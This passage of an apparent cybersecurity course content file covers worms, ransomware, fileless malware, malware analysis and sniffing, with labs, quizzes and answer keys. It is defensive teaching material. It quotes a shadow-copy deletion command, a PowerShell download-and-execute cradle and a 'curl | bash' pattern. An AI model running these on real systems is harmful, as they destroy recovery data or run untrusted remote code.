    "Wrappers bundle malware with legitimate files.",
    "Crypters encrypt malware to evade signature-based detection."
  ],
  "outcomes": [
    "Explain RATs and backdoors.",
    "Identify the purpose of wrappers and crypters."
  ],
  "meta": {
    "contentVersion": "1.0.0",
    "estimatedTime": 45,
    "difficulty": "Advanced",
    "prerequisites": [],
    "lastReviewed": "2026-07-18"
  }
};

CONTENT['viruses-worms'] = {
  "eyebrow": "Module 07 \u00b7 Topic 3",
  "title": "Viruses and Worms",
  "module": "Phase 07: Malware Analyst",
  "sub": "Ransomware, File Infection, and Propagation",
  "objectives": [
    "Differentiate viruses and worms",
    "Understand ransomware mechanics",
    "Identify propagation techniques"
  ],
  "learn": {
    "simple": "Viruses and worms are self-replicating malware. A virus requires a host file and user interaction to spread, while a worm is standalone and exploits network vulnerabilities to propagate automatically. Ransomware, which can be delivered via viruses, worms, or trojans, encrypts the victim\'s files and demands payment for the decryption key.",
    "analogy": "A virus is like a biological virus; it needs a host (a file) to infect. A worm is like a mold spore; it drifts on the wind (the network) and grows wherever it lands, without needing a specific host.",
    "architecture": "A file infector virus modifies an executable, inserting its malicious payload and modifying the entry point (OEP). When the file runs, the virus executes first, then passes control to the original program. Worms, like WannaCry, use exploits (e.g., EternalBlue/SMBv1) to scan the network, find vulnerable hosts, and execute arbitrary code to copy themselves over. Ransomware utilizes asymmetric cryptography (RSA) to encrypt a symmetric key (AES) which encrypts the actual files.",
    "why": "Worms can cause rapid, catastrophic failure across an enterprise network. Ransomware attacks pose significant financial and reputational risks."
  },
  "enterprise": {
    "gfs": "To protect against worms, GFS segments its network and strictly manages patch deployments to close vulnerabilities before they can be exploited.",
    "windows": "Ransomware on Windows typically targets documents and database files, often disabling Volume Shadow Copies (vssadmin) to prevent recovery.",
    "linux": "Linux worms often target vulnerable web applications or weak SSH credentials for lateral movement."
  },
  "workflow": [
    "Step 1: Disconnect infected systems from the network immediately.",
    "Step 2: Identify the propagation vector.",
    "Step 3: Block the exploit or port.",
    "Step 4: Locate patient zero.",
    "Step 5: Restore from offline backups.",
    "Step 6: Patch vulnerabilities."
  ],
  "diagram": {
    "caption": "Click to interact with the diagram",
    "svg": "<svg viewBox=\"0 0 600 400\" xmlns=\"http://www.w3.org/2000/svg\"><polygon points=\"300,100 400,300 200,300\" fill=\"#0f0\"/><text x=\"270\" y=\"220\">Worm</text></svg>"
  },
  "commands": {
    "lin": [
      {
        "cmd": "iptables -A INPUT -p tcp --dport 445 -j DROP",
        "purpose": "Block SMB traffic to stop worm propagation",
        "out": "No output",
        "note": "Temporary mitigation",
        "mistake": "Blocking all traffic unnecessarily"
      }
    ],
    "win": [
      {
        "cmd": "vssadmin list shadows",
        "purpose": "Check if ransomware deleted shadow copies",
        "out": "List of shadow copies or error",
        "note": "Ransomware often deletes these",
        "mistake": "Relying solely on shadow copies for backup"
      }
    ]
  },
  "lab": {
    "type": "guided",
    "difficulty": "Advanced",
    "duration": "45",
    "platform": "Windows 10",
    "environment": "Local Lab",
    "tools": [
      "Sysinternals",
      "Wireshark"
    ],
    "dependencies": [],
    "safety": [
      "Perform this lab only in an isolated sandbox environment."
    ],
    "scenario": "Analyze the network traffic of a simulated worm attempting lateral movement via SMB.",
    "objectives": [
      "Identify the scanning behavior and targeted ports."
    ],
    "steps": [
      "Step 1: Capture traffic in Wireshark and filter by `tcp.port == 445`."
    ],
    "evidence": [
      "PCAP showing excessive ARP requests and SYN packets to port 445."
    ],
    "validation": [
      "You should see: port scans originating from the infected IP."
    ],
    "troubleshooting": [
      "Ensure the vulnerable VM is online in the sandbox."
    ],
    "mitre": [
      {
        "id": "T1210",
        "name": "Exploitation of Remote Services",
        "tactic": "Lateral Movement"
      }
    ],
    "cleanup": [
      "Revert the sandbox VM."
    ]
  },
  "quiz": [
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is the primary difference between a virus and a worm?",
      "opts": [
        "Viruses are more dangerous",
        "Worms do not require a host file or user interaction to spread",
        "Viruses spread via network exploits",
        "Worms only infect Linux systems"
      ],
      "correct": 1,
      "fb": "Worms are self-propagating and exploit network vulnerabilities, while viruses attach to host files."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What action does ransomware typically take to prevent recovery?",
      "opts": [
        "Deletes the OS",
        "Encrypts files and deletes Volume Shadow Copies",
        "Changes the user password",
        "Formats the hard drive"
      ],
      "correct": 1,
      "fb": "Ransomware deletes shadow copies (backups) and encrypts files."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "A worm requires a user to click an executable to spread across the network.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. Worms spread automatically by exploiting vulnerabilities."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Advanced",
      "q": "Which cryptography scheme is commonly used by modern ransomware to secure the decryption key?",
      "opts": [
        "Symmetric only (e.g., AES)",
        "Asymmetric (e.g., RSA) to encrypt a Symmetric key",
        "Hashing (e.g., SHA-256)",
        "Base64 encoding"
      ],
      "correct": 1,
      "fb": "Ransomware uses a symmetric key for fast file encryption, and encrypts that key with an asymmetric public key."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which of the following is a famous example of a worm that exploited SMBv1?",
      "opts": [
        "Zeus",
        "WannaCry",
        "Emotet",
        "Stuxnet"
      ],
      "correct": 1,
      "fb": "WannaCry was a massive ransomware worm that exploited the EternalBlue vulnerability in SMBv1."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "File infector viruses modify the original executable file.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 0,
      "fb": "True. They insert malicious code and change the execution flow."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is the 'OEP' in the context of file infectors?",
      "opts": [
        "Original Execution Priority",
        "Original Entry Point",
        "Obfuscated Encryption Payload",
        "Open Enterprise Protocol"
      ],
      "correct": 1,
      "fb": "OEP (Original Entry Point) is where the legitimate program starts, which viruses often modify."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Advanced",
      "q": "How can network segmentation mitigate worm propagation?",
      "opts": [
        "By encrypting all traffic",
        "By updating antivirus signatures",
        "By restricting traffic flow between different network zones",
        "By disabling the firewall"
      ],
      "correct": 2,
      "fb": "Segmentation prevents a worm on one subnet from easily reaching and infecting systems on another subnet."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Paying the ransom guarantees that your files will be decrypted.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. You are dealing with criminals; there is no guarantee they will provide the key."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which command is often used by ransomware on Windows to delete shadow copies?",
      "opts": [
        "del *.*",
        "vssadmin delete shadows /all /quiet",
        "format c:",
        "rmdir /s /q"
      ],
      "correct": 1,
      "fb": "vssadmin is the legitimate tool abused to delete Volume Shadow Copies."
    }
  ],
  "flashcards": [
    {
      "f": "Worm",
      "b": "Standalone malware that propagates automatically over networks."
    },
    {
      "f": "Ransomware",
      "b": "Malware that encrypts files and demands payment."
    }
  ],
  "summary": [
    "Viruses require a host file and user interaction.",
    "Worms propagate automatically by exploiting network vulnerabilities.",
    "Ransomware encrypts files and deletes backups.",
    "WannaCry is a classic example of a ransomware worm.",
    "Network segmentation and patching are key defenses against worms."
  ],
  "outcomes": [
    "Differentiate viruses and worms.",
    "Understand ransomware encryption mechanisms."
  ],
  "meta": {
    "contentVersion": "1.0.0",
    "estimatedTime": 45,
    "difficulty": "Advanced",
    "prerequisites": [],
    "lastReviewed": "2026-07-18"
  }
};

CONTENT['fileless-malware'] = {
  "eyebrow": "Module 07 \u00b7 Topic 4",
  "title": "Fileless Malware",
  "module": "Phase 07: Malware Analyst",
  "sub": "Living off the Land, PowerShell, WMI, and Memory Injection",
  "objectives": [
    "Understand fileless malware concepts",
    "Identify LoTL techniques",
    "Analyze malicious PowerShell"
  ],
  "learn": {
    "simple": "Fileless malware is a type of malicious activity that uses native, legitimate tools built into the operating system (like PowerShell or WMI) to execute attacks. Instead of dropping a traditional executable file (.exe) onto the hard drive, it operates entirely in memory or hides within registry keys. This approach, known as 'Living off the Land' (LoTL), makes detection by traditional signature-based antivirus extremely difficult.",
    "analogy": "Imagine a burglar who breaks into a house not by bringing their own tools, but by finding the homeowner\'s tools in the garage and using them to open the safe. Because they use the owner\'s tools, it\'s harder to prove they brought anything suspicious.",
    "architecture": "A fileless attack often begins with a malicious macro in a Word document or a drive-by download. This triggers a script (e.g., PowerShell) that downloads a payload directly into RAM (Reflective DLL Injection) without writing it to disk. Persistence is achieved by creating WMI event subscriptions or adding scripts to the Windows Registry. Attackers abuse dual-use tools like certutil or mshta to download and execute code.",
    "why": "Fileless malware is pervasive in advanced attacks because it evades traditional file scanning. Defending against it requires behavior monitoring, script logging, and endpoint detection and response (EDR) solutions."
  },
  "enterprise": {
    "gfs": "GFS mitigates fileless threats by enforcing PowerShell Constrained Language Mode and enabling Script Block Logging, ensuring all commands are audited.",
    "windows": "Windows is the primary target for fileless malware due to the power of PowerShell, WMI, and the Registry.",
    "linux": "Linux fileless attacks might involve executing scripts directly from memory using bash features (e.g., `curl | bash`) or abusing tools like Python."
  },
  "workflow": [
    "Step 1: Enable PowerShell Script Block Logging.",
    "Step 2: Monitor process execution (Sysmon Event ID 1).",
    "Step 3: Analyze command-line arguments for obfuscation.",
    "Step 4: Hunt for unusual WMI activity.",
    "Step 5: Check registry run keys.",
    "Step 6: Implement application whitelisting."
  ],
  "diagram": {
    "caption": "Click to interact with the diagram",
    "svg": "<svg viewBox=\"0 0 600 400\" xmlns=\"http://www.w3.org/2000/svg\"><text x=\"200\" y=\"200\" font-size=\"24\">RAM (No Disk Write)</text></svg>"
  },
  "commands": {
    "lin": [
      {
        "cmd": "history | grep curl",
        "purpose": "Find potentially malicious downloads",
        "out": "Command history",
        "note": "Attackers may clear history",
        "mistake": "Only checking history, not memory"
      }
    ],
    "win": [
      {
        "cmd": "Get-WmiObject -Namespace root\\subscription -Class __EventFilter",
        "purpose": "Hunt for WMI persistence",
        "out": "WMI event filters",
        "note": "Look for unknown filters",
        "mistake": "Ignoring WMI as a persistence mechanism"
      }
    ]
  },
  "lab": {
    "type": "guided",
    "difficulty": "Advanced",
    "duration": "45",
    "platform": "Windows 10",
    "environment": "Local Lab",
    "tools": [
      "Sysmon",
      "Event Viewer"
    ],
    "dependencies": [],
    "safety": [
      "Perform this lab only in an isolated sandbox environment."
    ],
    "scenario": "Investigate an alert indicating suspicious PowerShell activity utilizing Base64 encoding.",
    "objectives": [
      "Decode the malicious PowerShell command and identify its intent."
    ],
    "steps": [
      "Step 1: Check Windows Event Logs for PowerShell Event ID 4104 (Script Block Logging).",
      "Step 2: Decode the Base64 string found in the log."
    ],
    "evidence": [
      "Decoded payload showing an attempted download."
    ],
    "validation": [
      "You should see: IEX (New-Object Net.WebClient).DownloadString(...)"
    ],
    "troubleshooting": [
      "Ensure Script Block Logging is enabled via GPO in the lab."
    ],
    "mitre": [
      {
        "id": "T1059.001",
        "name": "PowerShell",
        "tactic": "Execution"
      }
    ],
    "cleanup": [
      "Revert the sandbox VM."
    ]
  },
  "quiz": [
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is the defining characteristic of fileless malware?",
      "opts": [
        "It only infects Linux",
        "It operates primarily in memory using native OS tools",
        "It does not use the network",
        "It requires physical access"
      ],
      "correct": 1,
      "fb": "Fileless malware avoids writing executables to disk, running in memory via tools like PowerShell."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What does LoTL stand for in cybersecurity?",
      "opts": [
        "Living on the LAN",
        "Living off the Land",
        "Local Threat Logging",
        "Loss of Trust Level"
      ],
      "correct": 1,
      "fb": "Living off the Land refers to using legitimate, pre-installed tools for malicious purposes."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Traditional signature-based antivirus is highly effective against fileless malware.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. Since there is no traditional executable file to scan, signature-based AV often misses fileless attacks."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Advanced",
      "q": "Which Windows feature is frequently abused for fileless persistence?",
      "opts": [
        "Windows Defender",
        "WMI (Windows Management Instrumentation)",
        "BitLocker",
        "Hyper-V"
      ],
      "correct": 1,
      "fb": "Attackers create WMI event subscriptions to execute scripts persistently without traditional run keys."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Why do attackers encode PowerShell commands in Base64?",
      "opts": [
        "To make them execute faster",
        "To evade command-line inspection and logging",
        "To compress the payload",
        "Because PowerShell only understands Base64"
      ],
      "correct": 1,
      "fb": "Base64 encoding obfuscates the command, bypassing simple string-matching detection rules."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Fileless malware never writes any data to the hard drive.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. While it avoids executables, it may write scripts or configurations to the registry."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which Sysinternals tool is highly recommended for logging process creations with command-line arguments?",
      "opts": [
        "Process Explorer",
        "Sysmon (System Monitor)",
        "Autoruns",
        "TCPView"
      ],
      "correct": 1,
      "fb": "Sysmon logs detailed process creation events (Event ID 1), crucial for spotting malicious command lines."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Advanced",
      "q": "What is Reflective DLL Injection?",
      "opts": [
        "Writing a DLL to disk and loading it via the registry",
        "Loading a DLL directly from memory without saving it to disk",
        "Replacing a legitimate Windows DLL",
        "Using a DLL to bypass UAC"
      ],
      "correct": 1,
      "fb": "Reflective DLL injection allows an attacker to load a DLL entirely from memory, leaving no artifact on disk."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is the best defense against malicious PowerShell scripts in an enterprise environment?",
      "opts": [
        "Uninstalling PowerShell",
        "Using Constrained Language Mode and Script Block Logging",
        "Disabling the command prompt",
        "Installing a third-party firewall"
      ],
      "correct": 1,
      "fb": "Constrained Language Mode limits capabilities, and logging provides visibility into executed scripts."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Fileless attacks can begin with a malicious macro in a Microsoft Word document.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 0,
      "fb": "True. The macro executes a script (like PowerShell) that downloads and runs the payload in memory."
    }
  ],
  "flashcards": [
    {
      "f": "Fileless Malware",
      "b": "Malware that operates in memory using native OS tools."
    },
    {
      "f": "LoTL",
      "b": "Living off the Land; using built-in tools for attacks."
    }
  ],
  "summary": [
    "Fileless malware evades traditional AV by operating in memory.",
    "LoTL uses native tools like PowerShell and WMI.",
    "Persistence is often achieved via Registry or WMI.",
    "Base64 encoding is commonly used to obfuscate commands.",
    "Defenses include Script Block Logging and EDR."
  ],
  "outcomes": [
    "Understand Living off the Land techniques.",
    "Identify methods for detecting fileless malware."
  ],
  "meta": {
    "contentVersion": "1.0.0",
    "estimatedTime": 45,
    "difficulty": "Advanced",
    "prerequisites": [],
    "lastReviewed": "2026-07-18"
  }
};

CONTENT['malware-analysis'] = {
  "eyebrow": "Module 07 \u00b7 Topic 5",
  "title": "Malware Analysis",
  "module": "Phase 07: Malware Analyst",
  "sub": "YARA rules, Cuckoo sandbox, and Reversing basics",
  "objectives": [
    "Write YARA rules",
    "Understand sandbox analysis",
    "Explain basic reverse engineering"
  ],
  "learn": {
    "simple": "Malware analysis is the process of understanding the behavior and purpose of a suspicious file. It is divided into static analysis (examining code without running it) and dynamic analysis (running it in a secure environment like a Cuckoo sandbox). YARA is a powerful tool used to identify and classify malware based on textual or binary patterns. Reverse engineering involves taking the compiled malware and decompiling or disassembling it to understand its core logic.",
    "analogy": "Malware analysis is like investigating a suspected bomb. Static analysis is x-raying it to see the wires and components. Dynamic analysis is detonating it in a reinforced bunker to see the blast radius. Reverse engineering is carefully taking it apart piece by piece.",
    "architecture": "A malware analyst uses tools like IDA Pro or Ghidra for reverse engineering, reading assembly language (x86/x64) to trace the execution flow. They look for API calls (e.g., CreateRemoteThread, VirtualAllocEx) indicative of malicious activity. YARA rules use boolean expressions to match strings, hex byte sequences, or regular expressions within files. A Cuckoo Sandbox automates dynamic analysis, running the malware in a VM and generating a report on network activity, file system changes, and API hooking.",
    "why": "In-house malware analysis allows enterprises to extract Indicators of Compromise (IoCs) specific to targeted attacks, enabling proactive defense and threat hunting."
  },
  "enterprise": {
    "gfs": "GFS uses a combination of automated sandbox analysis for initial triage and manual reverse engineering for complex, targeted APT payloads.",
    "windows": "Analyzing Windows malware requires deep understanding of the PE (Portable Executable) file format and the Windows API.",
    "linux": "Linux malware analysis involves analyzing ELF binaries and understanding Linux system calls."
  },
  "workflow": [
    "Step 1: Set up an isolated analysis environment.",
    "Step 2: Obtain the malware hash and check OSINT.",
    "Step 3: Perform basic static analysis (strings, PE headers).",
    "Step 4: Perform dynamic analysis in a sandbox.",
    "Step 5: Write YARA rules based on findings.",
    "Step 6: Perform advanced reverse engineering if needed."
  ],
  "diagram": {
    "caption": "Click to interact with the diagram",
    "svg": "<svg viewBox=\"0 0 600 400\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"200\" y=\"150\" width=\"200\" height=\"100\" fill=\"#aaa\"/><text x=\"250\" y=\"200\">Cuckoo Sandbox</text></svg>"
  },
  "commands": {
    "lin": [
      {
        "cmd": "yara -m rules.yar suspicious_file",
        "purpose": "Scan for malware signatures",
        "out": "Matched rule names",
        "note": "Requires updated signatures",
        "mistake": "Scanning without updating rules"
      }
    ],
    "win": [
      {
        "cmd": "strings.exe -a malware.exe > output.txt",
        "purpose": "Extract human-readable strings from binary",
        "out": "Text strings",
        "note": "Useful for finding URLs and IPs",
        "mistake": "Ignoring Unicode strings"
      }
    ]
  },
  "lab": {
    "type": "guided",
    "difficulty": "Advanced",
    "duration": "45",
    "platform": "Kali Linux",
    "environment": "Local Lab",
    "tools": [
      "YARA",
      "Strings"
    ],
    "dependencies": [],
    "safety": [
      "Perform this lab only in an isolated sandbox environment."
    ],
    "scenario": "Create a custom YARA rule to detect a specific variant of ransomware found on a GFS server.",
    "objectives": [
      "Extract strings and write a functional YARA rule."
    ],
    "steps": [
      "Step 1: Extract strings from the sample.",
      "Step 2: Create a YARA rule matching the unique ransom note string."
    ],
    "evidence": [
      "Successful execution of the YARA rule against the sample."
    ],
    "validation": [
      "You should see: Ransomware_Rule_Matched"
    ],
    "troubleshooting": [
      "Check YARA syntax if the rule fails to compile."
    ],
    "mitre": [
      {
        "id": "T1059",
        "name": "Command and Scripting Interpreter",
        "tactic": "Execution"
      }
    ],
    "cleanup": [
      "Revert the sandbox VM."
    ]
  },
  "quiz": [
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is the primary purpose of a Cuckoo sandbox?",
      "opts": [
        "To write YARA rules",
        "To safely perform dynamic malware analysis",
        "To decompile malware",
        "To scan for vulnerabilities"
      ],
      "correct": 1,
      "fb": "Cuckoo is an automated dynamic malware analysis system."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What does a YARA rule primarily do?",
      "opts": [
        "Blocks network traffic",
        "Identifies malware based on textual or binary patterns",
        "Encrypts sensitive files",
        "Reverses compiled code"
      ],
      "correct": 1,
      "fb": "YARA helps classify malware by looking for specific strings or byte sequences."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Static analysis requires executing the malware.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. Static analysis involves examining the file without running it."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Advanced",
      "q": "Which tool is commonly used for disassembling and decompiling malware?",
      "opts": [
        "Wireshark",
        "Nmap",
        "Ghidra",
        "Metasploit"
      ],
      "correct": 2,
      "fb": "Ghidra (and IDA Pro) are the standard tools for reverse engineering binaries."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "When analyzing Windows malware, what is the PE file format?",
      "opts": [
        "Private Execution",
        "Portable Executable",
        "Pre-Compiled Environment",
        "Primary Extractor"
      ],
      "correct": 1,
      "fb": "The Portable Executable (PE) format is used for executables, object code, and DLLs in Windows."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Extracting 'strings' from a binary is a form of dynamic analysis.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. It is a form of basic static analysis because the file is not executed."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is a major limitation of basic static analysis?",
      "opts": [
        "It is too dangerous",
        "It requires an internet connection",
        "It can be defeated by packers and obfuscators",
        "It only works on Linux"
      ],
      "correct": 2,
      "fb": "Packers encrypt or compress the code, hiding the true strings and imports from static analysis tools."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Advanced",
      "q": "In reverse engineering, what does x86 Assembly language represent?",
      "opts": [
        "High-level source code",
        "Human-readable representation of machine code",
        "Encrypted network traffic",
        "YARA rule syntax"
      ],
      "correct": 1,
      "fb": "Assembly language is the lowest human-readable level of programming, translating directly to machine instructions."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Why is a sandbox environment critical for malware analysis?",
      "opts": [
        "It prevents the malware from infecting the host system or network",
        "It makes the malware run faster",
        "It automatically writes the malware report",
        "It provides a legal shield"
      ],
      "correct": 0,
      "fb": "A sandbox isolates the malware to prevent accidental infection and damage."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "YARA rules can match both text strings and hexadecimal byte sequences.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 0,
      "fb": "True. YARA is highly versatile and can match various patterns."
    }
  ],
  "flashcards": [
    {
      "f": "YARA",
      "b": "Tool used to identify malware based on patterns."
    },
    {
      "f": "Sandbox",
      "b": "Isolated environment for safely running dynamic analysis."
    }
  ],
  "summary": [
    "Malware analysis involves static and dynamic techniques.",
    "YARA uses rules to classify malware based on patterns.",
    "Cuckoo automates dynamic analysis in a sandbox.",
    "Reverse engineering uses tools like Ghidra to analyze code.",
    "Analysis provides IoCs for enterprise defense."
  ],
  "outcomes": [
    "Write basic YARA rules.",
    "Explain the purpose of a malware sandbox."
  ],
  "meta": {
    "contentVersion": "1.0.0",
    "estimatedTime": 45,
    "difficulty": "Advanced",
    "prerequisites": [],
    "lastReviewed": "2026-07-18"
  }
};


CONTENT['sniffing-concepts'] = {
  eyebrow: 'Module 08 · Topic 1',
  title: 'Sniffing Concepts',
  module: 'Phase 08: Network Security Analyst',
  sub: 'Understanding the fundamentals of network sniffing, active vs passive methods, and collision domains.',
  objectives: ['Differentiate between active and passive sniffing', 'Understand promiscuous mode and collision domains', 'Identify common sniffing tools and their use cases'],
  learn: {
    simple: 'Network sniffing is the process of monitoring and capturing all data packets passing through a given network. It is analogous to tapping a phone line, allowing an attacker to intercept communications. Sniffing can be passive (listening without transmitting) or active (injecting traffic to manipulate the network switch).',
    analogy: 'Imagine a postal worker reading everyone\'s mail before delivering it. Passive sniffing is like reading postcards that are openly visible, while active sniffing is like convincing the post office to route all mail through your personal mailbox.',
    architecture: 'In a non-switched network (hub), all traffic is broadcasted, making passive sniffing easy. In a switched network, each port is its own collision domain. Active sniffing techniques, like MAC flooding or ARP spoofing, are required to force the switch to send traffic to the attacker\'s port. Promiscuous mode allows a network interface card (NIC) to process all traffic it receives, regardless of the destination MAC address.',
    why: 'In enterprise environments, unencrypted traffic (like HTTP, FTP, Telnet) can be intercepted, leading to the compromise of sensitive data, credentials, and session tokens. Understanding sniffing is critical for implementing secure, encrypted protocols.'
  },
  enterprise: {
    gfs: 'At Global Financial Services, an unauthorized device connected to a branch office network could silently capture unencrypted SNMP traffic, exposing network device configurations.',
    windows: 'Windows environments can be vulnerable to LLMNR/NBT-NS spoofing (using tools like Responder), which relies on sniffing broadcast requests and spoofing responses to capture NTLM hashes.',
    linux: 'Linux systems are often used as sniffing platforms using tcpdump or Wireshark. Linux administrators must ensure management traffic (like SSH) is used instead of Telnet to prevent credential sniffing.'
  },
  workflow: ['Step 1: Identify the target network and topology.', 'Step 2: Connect to the network or compromise a host.', 'Step 3: Enable promiscuous mode on the network interface.', 'Step 4: Use a sniffing tool (e.g., Wireshark) to capture packets.', 'Step 5: Filter the captured data for sensitive information.', 'Step 6: Analyze the captured credentials or data.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="600" height="400" fill="#f8f9fa"/><text x="300" y="200" font-family="Arial" font-size="20" text-anchor="middle" fill="#333">Sniffing Architecture Diagram</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'tcpdump -i eth0 -w capture.pcap', purpose: 'Capture network traffic to a file', out: 'Packets saved to capture.pcap', note: 'Requires root privileges', mistake: 'Not specifying an interface can lead to capturing wrong traffic' }
    ],
    win: [
      { cmd: 'pktmon start --etw -p 0', purpose: 'Start packet monitor in Windows', out: 'Packet capture started', note: 'Built-in Windows tool', mistake: 'Forgetting to stop the capture can fill up disk space' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['Wireshark', 'tcpdump'],
    dependencies: [],
    safety: ['Perform this lab only in an isolated environment.'],
    scenario: 'GFS requires a baseline analysis of cleartext protocols on their internal network.',
    objectives: ['Capture and analyze FTP credentials using Wireshark'],
    steps: ['Step 1: Start Wireshark and select the active interface.', 'Step 2: Initiate an FTP connection from a client to a server.', 'Step 3: Stop the capture and filter for \'ftp\'.', 'Step 4: Identify the USER and PASS commands in the packet details.'],
    evidence: ['Screenshot of captured FTP credentials in Wireshark.'],
    validation: ['You should see: Cleartext username and password in the FTP traffic'],
    troubleshooting: ['If no FTP traffic is seen, ensure the client and server are on the same subnet.'],
    mitre: [{ id: 'T1040', name: 'Network Sniffing', tactic: 'Credential Access' }],
    cleanup: ['Close Wireshark and delete the capture file.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which of the following is an example of active sniffing?', opts: ['Monitoring traffic on a hub', 'Using span ports', 'MAC flooding', 'Mirroring traffic'], correct: 2, fb: 'MAC flooding is an active sniffing technique used to overwhelm a switch\'s CAM table, forcing it to act like a hub.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What does promiscuous mode do?', opts: ['Blocks all incoming traffic', 'Encrypts all outgoing traffic', 'Allows a NIC to process all traffic it receives', 'Hides the MAC address of the NIC'], correct: 2, fb: 'Promiscuous mode allows a NIC to process all frames it sees, not just those addressed to it.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which layer of the OSI model does network sniffing primarily operate on?', opts: ['Layer 1', 'Layer 2', 'Layer 3', 'Layer 7'], correct: 1, fb: 'Sniffing primarily operates at the Data Link layer (Layer 2) by capturing frames.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which tool is commonly used for passive network sniffing?', opts: ['arpspoof', 'macof', 'Wireshark', 'ettercap'], correct: 2, fb: 'Wireshark is a widely used protocol analyzer for passive sniffing.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is a collision domain?', opts: ['A network segment where data packets can collide', 'A firewall rule blocking traffic', 'A type of encrypted tunnel', 'A routing protocol'], correct: 0, fb: 'A collision domain is a network segment where simultaneous data transmissions can collide with each other.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'How does a switch mitigate passive sniffing?', opts: ['By encrypting all traffic', 'By sending traffic only to the intended destination port', 'By blocking unknown MAC addresses', 'By disabling promiscuous mode'], correct: 1, fb: 'Switches maintain a CAM table to send traffic only to the specific port where the destination MAC address is located, mitigating passive sniffing.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which protocol is vulnerable to cleartext credential sniffing?', opts: ['HTTPS', 'SSH', 'Telnet', 'SFTP'], correct: 2, fb: 'Telnet transmits data, including credentials, in cleartext.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'True or False: Passive sniffing requires injecting packets into the network.', opts: ['True', 'False'], correct: 1, fb: 'False. Passive sniffing simply involves listening to existing traffic without injecting anything.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is the primary goal of sniffing in a penetration test?', opts: ['To crash the network', 'To capture sensitive information like credentials', 'To map the network topology', 'To exploit a web vulnerability'], correct: 1, fb: 'The primary goal is often to capture sensitive data, such as credentials, session IDs, or confidential documents.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which hardware device makes passive sniffing easiest?', opts: ['Switch', 'Router', 'Firewall', 'Hub'], correct: 3, fb: 'A hub broadcasts all traffic to all ports, making passive sniffing trivial.' }
  ],
  flashcards: [
    { f: 'Passive Sniffing', b: 'Listening to network traffic without transmitting any data, typically on a hub.' },
    { f: 'Promiscuous Mode', b: 'A configuration that allows a network interface to pass all traffic it receives to the CPU, rather than just frames addressed to it.' },
    { f: 'Collision Domain', b: 'A logical network area where data packets can collide with one another when sent on a shared medium.' }
  ],
  summary: ['Sniffing captures network traffic for analysis.', 'Passive sniffing works on hubs; active sniffing is required for switches.', 'Promiscuous mode enables full packet capture.', 'Unencrypted protocols are highly vulnerable to sniffing.', 'Switches use CAM tables to route traffic, which attackers try to manipulate.'],
  outcomes: ['Differentiate between active and passive sniffing.', 'Explain the concept of promiscuous mode.', 'Identify tools used for network sniffing.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Intermediate", prerequisites: [], lastReviewed: "2026-07-18" }
};

CONTENT['mac-attacks'] = {
  eyebrow: 'Module 08 · Topic 2',
  title: 'MAC Attacks',
  module: 'Phase 08: Network Security Analyst',
